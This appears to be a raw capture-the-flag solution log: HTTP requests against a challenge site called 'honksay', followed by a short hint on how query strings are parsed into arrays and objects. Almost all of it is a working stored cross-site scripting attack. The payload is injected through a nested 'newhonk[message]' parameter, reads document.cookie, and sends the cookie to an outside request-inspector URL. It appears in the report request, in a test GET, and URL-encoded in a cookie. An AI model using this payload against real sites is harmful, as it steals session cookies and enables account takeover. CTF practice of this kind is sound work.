POST /report HTTP/1.1
Host: honksay.ctf.maplebacon.org
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:91.0) Gecko/20100101 Firefox/91.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Content-Type: application/x-www-form-urlencoded
Content-Length: 199
Origin: http://honksay.ctf.maplebacon.org
Connection: close
Referer: http://honksay.ctf.maplebacon.org/
Cookie: honk=HONK; honkcount=0
Upgrade-Insecure-Requests: 1

url=http://localhost:9988/changehonk?newhonk[message]=<script>img=new+Image();date=document.cookie;img.src='https://requestinspector.com/inspect/01gbfjfxcse4stadnqcpmkftve/?d='.concat(date);</script>


Experiment:
GET /changehonk?newhonk[message]=<script>img=new+Image();date=document.cookie;img.src='https://requestinspector.com/inspect/01gbfjfxcse4stadnqcpmkftve/?d='.concat(date);</script> HTTP/1.1
Host: honksay.ctf.maplebacon.org
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:91.0) Gecko/20100101 Firefox/91.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Connection: close
Cookie: honk=undefined; honkcount=0
Upgrade-Insecure-Requests: 1


GET / HTTP/1.1
Host: honksay.ctf.maplebacon.org
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:91.0) Gecko/20100101 Firefox/91.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Connection: close
Cookie: honk=j%3A%7B%22message%22%3A%22%3Cscript%3Eimg%3Dnew%20Image()%3Bdate%3Ddocument.cookie%3Bimg.src%3D'https%3A%2F%2Frequestinspector.com%2Finspect%2F01gbfjfxcse4stadnqcpmkftve%2F%3Fd%3D'.concat(date)%3B%3C%2Fscript%3E%22%7D; honkcount=0
Upgrade-Insecure-Requests: 1


hint:
username[]=a&username[]=b is interpreted as username = ['a', 'b'] <----considered as an array
username=a&username=b is interpreted as username = ['a', 'b'] <----considered as an array
username[hello]=a is interpreted as username = {hello: 'a'} <------considered as an object
username=a is interpreted as username = a <-------considered as string

